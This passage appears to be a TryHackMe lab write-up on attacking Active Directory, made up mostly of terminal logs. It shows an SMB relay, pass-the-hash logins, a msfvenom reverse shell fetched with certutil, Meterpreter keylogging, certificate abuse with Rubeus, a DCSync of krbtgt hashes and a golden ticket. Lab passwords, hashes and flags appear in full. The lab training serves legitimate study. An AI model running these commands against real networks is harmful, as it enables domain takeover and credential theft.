[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.200.79.202, attacking target smb://10.200.79.201
[*] Authenticating against smb://10.200.79.201 as ZA/THMSERVER2$ SUCCEED
[+] No more targets
[*] SMBD-Thread-7 (process_request_thread): Connection from 10.200.79.202 controlled, but there are no more targets left!
[+] No more targets
[*] SMBD-Thread-8 (process_request_thread): Connection from 10.200.79.202 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[+] ExecuteRemote command: %COMSPEC% /Q /c echo type C:\Users\Administrator.ZA\Desktop\flag3.txt ^> %SYSTEMROOT%\Temp\__output > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
[*] Executed specified command on host: 10.200.79.201
THM{Printing.Some.Shellz}
[*] Stopping service RemoteRegistry
```

## Exploiting AD Users

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# evil-winrm -i 10.200.79.201 -u ServerAdmin -H 3279a0c6dfe15dc3fb6e9c26dd9b066c

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT=4444 -f psh -o shell.ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of psh file: 3242 bytes
Saved as: shell.ps1

root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.200.79.201 - - [23/Jul/2022 23:42:28] "GET /shell.ps1 HTTP/1.1" 200 -
10.200.79.201 - - [23/Jul/2022 23:42:29] "GET /shell.ps1 HTTP/1.1" 200 -
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> certutil -urlcache -f http://10.50.78.162:8080/shell.ps1 shell.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/23/2022   7:12 PM           3242 shell.ps1


*Evil-WinRM* PS C:\Users\Administrator\Documents> .\shell.ps1
4012
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT 4444; exploit"
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
LHOST => exploitad
LPORT => 4444
[*] Started reverse TCP handler on 10.50.78.162:4444
[*] Sending stage (200774 bytes) to 10.200.79.201
[*] Meterpreter session 1 opened (10.50.78.162:4444 -> 10.200.79.201:55382) at 2022-07-23 23:43:20 +0530

meterpreter > whoami
[-] Unknown command: whoami
meterpreter > ps | grep "explorer"
Filtering on 'explorer'

Process List
============

 PID   PPID  Name          Arch  Session  User                     Path
 ---   ----  ----          ----  -------  ----                     ----
 3668  3652  explorer.exe  x64   1        THMSERVER1\trevor.local  C:\Windows\explorer.exe

meterpreter > migrate 3668
[*] Migrating from 2992 to 3668...
[*] Migration completed successfully.
meterpreter > getuid
Server username: THMSERVER1\trevor.local
meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > keyscan_dump
Dumping captured keystrokes...
keep<CR>
<Shift>Imreallysurenoonewillguessmypassword<CR>
keep<CR>
<Shift>Imreallysurenoonewillguessmypassword<CR>
```

```powershell
*Evil-WinRM* PS C:\Users\trevor.local\Documents> download /Users/trevor.local/Documents/PasswordDatabase.kdbx
Info: Downloading /Users/trevor.local/Documents/PasswordDatabase.kdbx to ./PasswordDatabase.kdbx


Info: Download successful!
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# keepassx PasswordDatabase.kdbx
libGL error: pci id for fd 11: 1ab8:0010, driver (null)
pci id for fd 12: 1ab8:0010, driver (null)
qt.xkb.compose: failed to create compose table
```

Password for database ```Imreallysurenoonewillguessmypassword```

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/db1.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/db2.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/db3.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/db4.png" />
</center>


## Exploiting GPOs

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/bh4.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/bh5.png" />
</center>

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# xfreerdp  /v:10.200.79.248 /u:max.smith /p:Kdbt1458 /dynamic-resolution
[20:37:09:691] [3423:3424] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[20:37:09:692] [3423:3424] [WARN][com.freerdp.crypto] - CN = THMWRK1.za.tryhackme.loc
[20:37:09:692] [3423:3424] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[20:37:09:692] [3423:3424] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[20:37:09:692] [3423:3424] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[20:37:09:692] [3423:3424] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.200.79.248:3389)
[20:37:09:692] [3423:3424] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[20:37:09:692] [3423:3424] [ERROR][com.freerdp.crypto] - Common Name (CN):
[20:37:09:692] [3423:3424] [ERROR][com.freerdp.crypto] -        THMWRK1.za.tryhackme.loc
[20:37:09:692] [3423:3424] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
```

```cmd
C:\Users\max.smith>runas /netonly /user:za.tryhackme.loc\svcServMan cmd.exe
Enter the password for za.tryhackme.loc\svcServMan:
Attempting to start cmd.exe as user "za.tryhackme.loc\svcServMan" ...
```

```cmd
C:\Users\max.smith>dir \\za.tryhackme.loc\sysvol
 Volume in drive \\za.tryhackme.loc\sysvol is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\za.tryhackme.loc\sysvol

04/25/2022  07:17 PM    <DIR>          .
04/25/2022  07:17 PM    <DIR>          ..
04/25/2022  07:17 PM    <JUNCTION>     za.tryhackme.loc [C:\Windows\SYSVOL\domain]
               0 File(s)              0 bytes
               3 Dir(s)  51,442,769,920 bytes free
```

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/cmd1.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc1.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc2.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc3.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc4.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc5.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc6.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc7.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc8.png" />
</center>

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# ssh za.tryhackme.loc\\max.smith@THMSERVER2.za.tryhackme.loc
The authenticity of host 'thmserver2.za.tryhackme.loc (10.200.79.202)' can't be established.
ED25519 key fingerprint is SHA256:50ZqYlTFUYKTHHPzgPNzG0gSydLnknXL0Ea7lUs7tT8.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:39: [hashed name]
    ~/.ssh/known_hosts:41: [hashed name]
    ~/.ssh/known_hosts:42: [hashed name]
    ~/.ssh/known_hosts:43: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added 'thmserver2.za.tryhackme.loc' (ED25519) to the list of known hosts.
za.tryhackme.loc\max.smith@thmserver2.za.tryhackme.loc's password:
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.
```

```powershell
PS C:\Users\Administrator\Desktop> type .\flag4.txt
THM{Exploiting.GPOs.For.Fun.And.Profit}
PS C:\Users\Administrator\Desktop> net user max.smith /domain
The request will be processed at a domain controller for domain za.tryhackme.loc.

User name                    max.smith
Full Name                    Max Smith
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/25/2022 7:30:04 PM
Password expires             Never
Password changeable          4/26/2022 7:30:04 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/25/2022 4:30:35 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Internet Access      *IT Support
                             *Domain Users
The command completed successfully.
```

## Exploiting Certificates

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# xfreerdp  /v:10.200.79.202 /u:max.smith /p:Kdbt1458 /dynamic-resolution
[21:30:44:696] [4065:4066] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[21:30:44:696] [4065:4066] [WARN][com.freerdp.crypto] - CN = THMSERVER2.za.tryhackme.loc
```

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc10.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc11.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc12.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc13.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc14.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc15.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc16.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc17.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc18.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc19.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc20.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc21.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc22.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc23.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc24.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc25.png" />
</center>

Password@123

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc26.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc27.png" />
</center>

```powershell
PS C:\Users\max.smith> cd .\Documents\
PS C:\Users\max.smith\Documents> ls


    Directory: C:\Users\max.smith\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/25/2022   5:41 PM           4415 enumore.pfx


PS C:\Users\max.smith\Documents> pwd

Path
----
C:\Users\max.smith\Documents


PS C:\Users\max.smith\Documents> C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:enumore.pfx /password:Password@123 /outfile:administator.kirbi /domain:za.tryhackme.loc /dc:10.200.79.101

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Ask TGT

[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=enumore
[*] Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\Administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

[*] Ticket written to administator.kirbi


  ServiceName              :  krbtgt/za.tryhackme.loc
  ServiceRealm             :  ZA.TRYHACKME.LOC
  UserName                 :  Administrator
  UserRealm                :  ZA.TRYHACKME.LOC
  StartTime                :  7/25/2022 5:47:30 PM
  EndTime                  :  7/26/2022 3:47:30 AM
  RenewTill                :  8/1/2022 5:47:30 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  RckeKnmhBemqSUNIs06q7qjJvfz9iuw6YzM2eEjBJbY=
  ASREP (key)              :  7DBAE0671630EE046E3E00885821E2C5DFA390E7CADB4029E3053FAADBD06777

PS C:\Users\max.smith\Documents> ls


    Directory: C:\Users\max.smith\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/25/2022   5:47 PM           1552 administator.kirbi
-a----        7/25/2022   5:41 PM           4415 enumore.pfx


PS C:\Users\max.smith\Documents> C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt administator.kirbi

* File: 'administator.kirbi': OK

mimikatz # exit
Bye!
PS C:\Users\max.smith\Documents> klist

Current LogonId is 0:0x517c2e

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.TRYHACKME.LOC
        Server: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 7/25/2022 17:47:30 (local)
        End Time:   7/26/2022 3:47:30 (local)
        Renew Time: 8/1/2022 17:47:30 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
PS C:\Users\max.smith\Documents> dir \\THMDC.za.tryhackme.loc\c$\


    Directory: \\THMDC.za.tryhackme.loc\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018   8:19 AM                PerfLogs
d-r---        3/21/2020   8:31 PM                Program Files
d-----        3/21/2020   8:28 PM                Program Files (x86)
d-----        4/25/2022   7:13 PM                tmp
d-r---        6/14/2022   3:13 PM                Users
d----l        4/25/2022   7:11 PM                vagrant
d-----        4/27/2022   8:12 PM                Windows
-a----         1/4/2022   7:47 AM            103 delete-vagrant-user.ps1
-a----         5/1/2022   9:11 AM            169 dns_entries.csv
-a----         5/1/2022   9:17 AM           1725 thm-network-setup-dc.ps1


PS C:\Users\max.smith\Documents> type '\\THMDC.za.tryhackme.loc\c$\Users\Administrator\Desktop\flag5.txt'
THM{AD.Certs.Can.Get.You.DA}
```

## Exploiting Domain Trusts

```powershell

PS C:\Users\max.smith\Documents> C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /user:za\krbtgt
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server
[DC] 'za\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 4/25/2022 7:18:22 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 16f9af38fca3ada405386b3b57366082
    ntlm- 0: 16f9af38fca3ada405386b3b57366082
    lm  - 0: 35c7b671efe40860dc078afd2786c902

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4bf7050f5f09f6d59a8699081d9ed432

* Primary:Kerberos-Newer-Keys *
    Default Salt : ZA.TRYHACKME.LOCkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 9b52d4ffae227e50025574e4347783ee4f4f6c01c110b1ad4c715d0c977558ca
      aes128_hmac       (4096) : c893fd72ddf7fe2ee545f52b8368602f
      des_cbc_md5       (4096) : d904d37f8ab6fed6

* Primary:Kerberos *
    Default Salt : ZA.TRYHACKME.LOCkrbtgt
    Credentials
      des_cbc_md5       : d904d37f8ab6fed6

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  59ef8461b2d3808973106d3eae741ca6
    02  e7e04d83662aa1f0e23058bf822db70c
    03  738f9c03bbcfe61e0cc1f617a56ee1ca
    04  59ef8461b2d3808973106d3eae741ca6
    05  e7e04d83662aa1f0e23058bf822db70c
    06  cf5bf42182aaaa694a6ca51ab2346e97
    07  59ef8461b2d3808973106d3eae741ca6
    08  7943328089ebb9cd6856cb93e1c8e5eb
    09  7943328089ebb9cd6856cb93e1c8e5eb
    10  703d09859f5291a805f35efce9b2de4d
    11  7ec84ffce154f8c3576c5ccfe270e306
    12  7943328089ebb9cd6856cb93e1c8e5eb
    13  09fcdbe4d28a7e845c4f7df0f5b942aa
    14  7ec84ffce154f8c3576c5ccfe270e306
    15  9f5d5af22548a18694bb8886e2f6a0eb
    16  9f5d5af22548a18694bb8886e2f6a0eb
    17  8d0eff223c176f71093f9d03f8a307df
    18  f5d27cfa462b19d062670445682aef8c
    19  3329d0412509cfe735c064d303dd05dc
    20  7b5fb40e95c2fb16b5b92843158e83af
    21  17a9bb9485f780cbe33945fc581532a2
    22  17a9bb9485f780cbe33945fc581532a2
    23  340490cea65bf6b5927cdf51444ef524
    24  14fbfe8a903667e4901113f484711a62
    25  14fbfe8a903667e4901113f484711a62
    26  f67574e138db44d188d1e11b1f92a9d5
    27  fd72b74747a58338ccfe1bd6d3527445
    28  f9b2e0e39df0a0cbeffa119c03a87b9b
    29  33a0a6986ba90410cbe8b5751a982393
```

```powershell
PS C:\Users\max.smith\Documents> Get-ADComputer -Identity "THMDC"


DistinguishedName : CN=THMDC,OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
DNSHostName       : THMDC.za.tryhackme.loc
Enabled           : True
Name              : THMDC
ObjectClass       : computer
ObjectGUID        : bd651750-782b-4b09-93b4-b5987ec7311b
SamAccountName    : THMDC$
SID               : S-1-5-21-3885271727-2693558621-2658995185-1001
UserPrincipalName :



PS C:\Users\max.smith\Documents> Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc


DistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc
GroupCategory     : Security
GroupScope        : Universal
Name              : Enterprise Admins
ObjectClass       : group
ObjectGUID        : a23ae384-16e8-44d5-9b36-8173c4e0e5de
SamAccountName    : Enterprise Admins
SID               : S-1-5-21-3330634377-1326264276-632209373-519
```

```powershell
PS C:\Users\max.smith\Documents> C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt
User      : Administrator
Domain    : za.tryhackme.loc (ZA)
SID       : S-1-5-21-3885271727-2693558621-2658995185-1001
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3330634377-1326264276-632209373-519 ;
ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt
Service   : krbtgt
Lifetime  : 7/25/2022 6:18:02 PM ; 7/22/2032 6:18:02 PM ; 7/22/2032 6:18:02 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ za.tryhackme.loc' successfully submitted for current session

mimikatz # exit
Bye!
PS C:\Users\max.smith\Documents> klist

Current LogonId is 0:0x517c2e

Cached Tickets: (1)

#0>     Client: Administrator @ za.tryhackme.loc
        Server: krbtgt/za.tryhackme.loc @ za.tryhackme.loc
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 7/25/2022 18:18:02 (local)
        End Time:   7/22/2032 18:18:02 (local)
        Renew Time: 7/22/2032 18:18:02 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
        
PS C:\Users\max.smith\Documents> dir \\THMDC.za.tryhackme.loc\c$\


    Directory: \\THMDC.za.tryhackme.loc\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018   8:19 AM                PerfLogs
d-r---        3/21/2020   8:31 PM                Program Files
d-----        3/21/2020   8:28 PM                Program Files (x86)
d-----        4/25/2022   7:13 PM                tmp
d-r---        6/14/2022   3:13 PM                Users
d----l        4/25/2022   7:11 PM                vagrant
d-----        4/27/2022   8:12 PM                Windows
-a----         1/4/2022   7:47 AM            103 delete-vagrant-user.ps1
-a----         5/1/2022   9:11 AM            169 dns_entries.csv
-a----         5/1/2022   9:17 AM           1725 thm-network-setup-dc.ps1
```

```powershell
PS C:\> dir \\thmrootdc.tryhackme.loc\c$\


    Directory: \\thmrootdc.tryhackme.loc\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018   8:19 AM                PerfLogs
d-r---        3/21/2020   8:31 PM                Program Files
d-----        3/21/2020   8:28 PM                Program Files (x86)
d-----        4/25/2022   5:50 PM                tmp
d-r---        4/27/2022   7:54 AM                Users
d----l        4/25/2022   5:50 PM                vagrant
d-----        4/27/2022   6:29 PM                Windows
-a----         1/4/2022   7:47 AM            103 delete-vagrant-user.ps1
-a----         5/1/2022   8:42 AM             31 root_dns_entries.csv
-a----         5/1/2022   9:07 AM           1767 thm-network-setup-dc.ps1


PS C:\> type  '\\thmrootdc.tryhackme.loc\c$\Users\Administrator\Desktop\flag6.txt'
THM{Full.EA.Compromise}
```

## Conclusion